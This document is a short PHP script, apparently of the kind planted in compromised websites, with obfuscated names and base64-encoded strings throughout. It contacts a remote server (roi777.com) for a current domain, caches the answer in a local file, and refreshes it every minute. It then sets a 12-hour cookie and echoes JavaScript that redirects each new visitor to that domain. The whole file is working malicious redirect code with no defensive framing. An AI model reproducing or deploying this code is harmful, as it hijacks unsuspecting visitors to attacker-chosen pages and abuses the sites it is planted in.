<?php
$id6fe1d0be634 = "/index/?2601510941471";
$z8c7dd922ad47 = md5($id6fe1d0be634); // 71ba5704c07aec55402cb7d674cb5783
$u77e8e1445762 = time();
$geaa082fa5781 = filemtime($z8c7dd922ad47);
$u07cc694b9b3f = $u77e8e1445762 - $geaa082fa5781;
if (file_exists($z8c7dd922ad47)) {
    $fe1260894f59e = @fopen($z8c7dd922ad47, base64_decode('cg==')); // r
    $xe4e46deb7f9c = json_decode(base64_decode(fread($fe1260894f59e, filesize($z8c7dd922ad47))), 1);
    fclose($fe1260894f59e);
}
if ($u07cc694b9b3f >= 60 || !file_exists($z8c7dd922ad47)) {
    $v9b207167e538 = getDDroi($z8c7dd922ad47);
    if ($v9b207167e538[base64_decode('ZG9tYWlu') ]) { // domain
        $je617ef6974fa = base64_decode('aHR0cDovLw==') /* http:// */ . $v9b207167e538[base64_decode('ZG9tYWlu') ] . $id6fe1d0be634;
    } else {
        $wd88fc6edf21e = curl_init();
        curl_setopt($wd88fc6edf21e, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($wd88fc6edf21e, CURLOPT_USERAGENT, base64_decode('QUkgcnNydg==')); // AI rsrv
        curl_setopt($wd88fc6edf21e, CURLOPT_URL, $xe4e46deb7f9c[base64_decode('cnNydg==') ]); // rsrv
        curl_setopt($wd88fc6edf21e, CURLOPT_TIMEOUT, 10);
        $sad5f82e879a9 = curl_exec($wd88fc6edf21e);
        curl_close($wd88fc6edf21e);
        $je617ef6974fa = base64_decode('aHR0cDovLw==') /* http:// */ . $sad5f82e879a9 . $id6fe1d0be634;
    }
} else {
    $je617ef6974fa = base64_decode('aHR0cDovLw==') . $xe4e46deb7f9c[base64_decode('ZG9tYWlu') ] /* domain */ . $id6fe1d0be634;
}
function getDDroi($z8c7dd922ad47) {
    $wd88fc6edf21e = curl_init();
    curl_setopt($wd88fc6edf21e, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($wd88fc6edf21e, CURLOPT_USERAGENT, base64_decode('QUkgcm9p')); // AI roi
    curl_setopt($wd88fc6edf21e, CURLOPT_URL, base64_decode('aHR0cDovL3JvaTc3Ny5jb20vZG9tYWluX3RlbXAucGhwP2Y9anNvbg==')); // http://roi777.com/domain_temp.php?f=json
    curl_setopt($wd88fc6edf21e, CURLOPT_TIMEOUT, 10);
    $sb4a88417b3d0 = curl_exec($wd88fc6edf21e);
    curl_close($wd88fc6edf21e);
    $xe4e46deb7f9c = json_decode($sb4a88417b3d0, true);
    if ($xe4e46deb7f9c[base64_decode('ZG9tYWlu') ]) { // domain
        $y0666f0acdeed = @fopen($z8c7dd922ad47, base64_decode('dys=')); // w+
        @fwrite($y0666f0acdeed, base64_encode($sb4a88417b3d0));
        @fclose($y0666f0acdeed);
        return $xe4e46deb7f9c;
    } else return false;
}
if (!$_COOKIE[base64_decode('YTc3N2Q=') ]) { // a777d
    setcookie(base64_decode('YTc3N2Q='), 1, time() + 43200, base64_decode('Lw==')); // /
    echo base64_decode('PHNjcmlwdD53aW5kb3cubG9jYXRpb24ucmVwbGFjZSgi') /* <script>window.location.replace(" */ . $je617ef6974fa . base64_decode('Iik7d2luZG93LmxvY2F0aW9uLmhyZWYgPSAi') /* ");window.location.href = " */ . $je617ef6974fa . base64_decode('Ijs8L3NjcmlwdD4='); // ";</script>
} ?>
